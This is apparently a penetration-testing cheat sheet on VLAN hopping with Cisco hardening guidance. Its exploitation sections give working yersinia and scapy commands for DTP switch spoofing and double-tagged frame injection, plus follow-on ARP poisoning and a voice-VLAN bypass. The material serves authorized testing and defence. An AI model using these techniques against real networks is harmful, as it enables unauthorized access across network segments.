# VLAN Hopping

> Cross from one VLAN to another on a switched network by abusing trunking / DTP / double-tagging. Authorized testing only. Map: MITRE ATT&CK T1599 Network Boundary Bridging.

## TL;DR
- Two canonical techniques: **Switch Spoofing** (negotiate trunk via DTP) and **Double Tagging** (Q-in-Q frame from access port).
- Cisco switches with DTP enabled (default on older IOS) + access port → attacker fakes DTP → port becomes a trunk → attacker sees all VLANs.
- Double tagging only sends — one-way attack — but useful for delivering arbitrary frames into a target VLAN (poison ARP across VLAN boundary).
- Modern Cisco / Juniper / Arista defaults disable DTP, but legacy gear remains. Voice/Data trunked ports are still common and abused.
- Defence: explicit `switchport mode access` + `switchport nonegotiate`; unused ports administratively shut; trunk allow-list (`switchport trunk allowed vlan`); native VLAN of trunks unused.

## Detection / Discovery

### Is the port DTP-negotiating?
On a switch, `show interfaces <if> switchport` displays:
```
Administrative Mode: dynamic auto    ← negotiates if peer offers DTP (vulnerable)
Operational Mode: static access      ← currently access; will switch if DTP arrives
```
From an attacker host, sniff DTP frames (CDP/LLDP-adjacent, multicast `01:00:0C:CC:CC:CC`):
```bash
sudo tcpdump -ni eth0 -v 'ether host 01:00:0c:cc:cc:cc'
# DTP frames every 30s if enabled
```

### Yersinia (DTP / STP / CDP attack toolkit)
```bash
sudo yersinia -G            # GUI
# or CLI
sudo yersinia dtp -attack 1 -interface eth0   # "enable trunking" attack
```

### scapy (manual DTP forge)
```python
from scapy.all import *
dtp = Dot3(dst='01:00:0C:CC:CC:CC') / LLC() / SNAP() / DTP(...)
sendp(dtp, iface='eth0', loop=1, inter=30)
```

## Exploitation

### Switch Spoofing — get full trunk access
1. Attacker host on an "access" port that's actually `dynamic auto` or `dynamic desirable`.
2. Send DTP frames asking for trunk (`yersinia`'s "enable trunking" attack or scapy).
3. Switch agrees; the port becomes a trunk passing all VLANs.
4. On attacker host, configure 802.1Q tagging on the kernel:
   ```bash
   sudo ip link add link eth0 name eth0.20 type vlan id 20
   sudo ip link set eth0.20 up
   sudo dhclient eth0.20    # now in VLAN 20 with its DHCP
   ```
5. Repeat for each interesting VLAN ID.

### Double Tagging — one-way frame injection
Works only when:
- Attacker is on an access port that's in the **native VLAN** of an upstream trunk.
- Native VLAN tag is untagged on trunks (default Cisco behaviour, problematic by design).

Frame: outer tag = native VLAN, inner tag = target VLAN. Switch 1 sees a matching native-VLAN frame, strips the outer tag, forwards to switch 2 via trunk. Switch 2 sees the inner tag, delivers to the target VLAN.

```python
from scapy.all import *
# outer 802.1Q tag = native VLAN (1), inner = target (20)
pkt = Ether(dst='ff:ff:ff:ff:ff:ff') / Dot1Q(vlan=1) / Dot1Q(vlan=20) / IP(dst='10.0.20.255') / ICMP()
sendp(pkt, iface='eth0', count=5)
```
The target VLAN's broadcast domain sees the ICMP. No return path through the same trick — but useful to deliver ARP poison, malformed DHCP, etc., across VLAN boundaries.

### Once in the target VLAN
Standard post-foothold:
- DHCP for an IP in the VLAN.
- ARP sweep / nmap discovery.
- LLMNR poisoning / responder against the new segment (see [./llmnr-nbtns-responder.md](./llmnr-nbtns-responder.md)).
- Reach internal services not exposed to the original VLAN.

## Bypasses
- DTP disabled but trunk port configured statically with `switchport trunk allowed vlan all` → if attacker reaches that trunk port physically, full access. Less common but exists in patch-panel rooms.
- 802.1x port-auth would block the attacker from ever reaching the port — out of scope here (attacker assumed authenticated to the network).
- Voice VLAN (`voiceVLAN`) on data ports = the access port has a *second* VLAN for IP phones. Attacker can join the voice VLAN by sending tagged frames with voice VLAN ID — bypasses the data-VLAN ACL.

## Defence / Remediation
- **Explicit access mode + no DTP**:
  ```
  interface Gi1/0/1
   switchport mode access
   switchport access vlan 10
   switchport nonegotiate
   switchport port-security maximum 1
   switchport port-security violation shutdown
  ```
- **Trunk hardening**:
  ```
  interface Gi1/0/24
   switchport mode trunk
   switchport trunk encapsulation dot1q
   switchport trunk allowed vlan 10,20,30      ← explicit allow-list
   switchport trunk native vlan 999            ← put native VLAN on an unused/dummy VLAN
   switchport nonegotiate
  ```
- **Unused ports**: `shutdown` + `switchport access vlan <isolated-VLAN>`.
- **Voice VLAN**: only on phone ports; use `mls qos trust device cisco-phone` so non-phones can't speak voice-VLAN tags.
- **Dynamic Trunking Protocol globally disabled** on access switches.
- **CDP/LLDP** off on user-facing ports — reduces reconnaissance.
- **802.1x port authentication** + dynamic VLAN assignment by RADIUS — only authorised devices, on the correct VLAN.
- **NAC (Network Access Control)** with posture check.

## Sources
- Cisco — Configuring VLAN Trunks: https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst3750/software/release/12-2_55_se/configuration/guide/scg3750/swvlan.html
- IEEE 802.1Q tagging standard: https://standards.ieee.org/standard/802_1Q-2022.html
- Yersinia: https://github.com/tomac/yersinia
- Scapy 802.1Q: https://scapy.readthedocs.io/en/latest/usage.html#sending-and-receiving-with-vlans
- HackTricks pentesting network — VLAN hopping: https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/index.html#vlan-hopping
- MITRE ATT&CK T1599.001 Network Address Translation Traversal: https://attack.mitre.org/techniques/T1599/
- NIST SP 800-46 (Telework / Remote Access Security — VLAN guidance): https://csrc.nist.gov/publications/detail/sp/800-46/rev-2/final
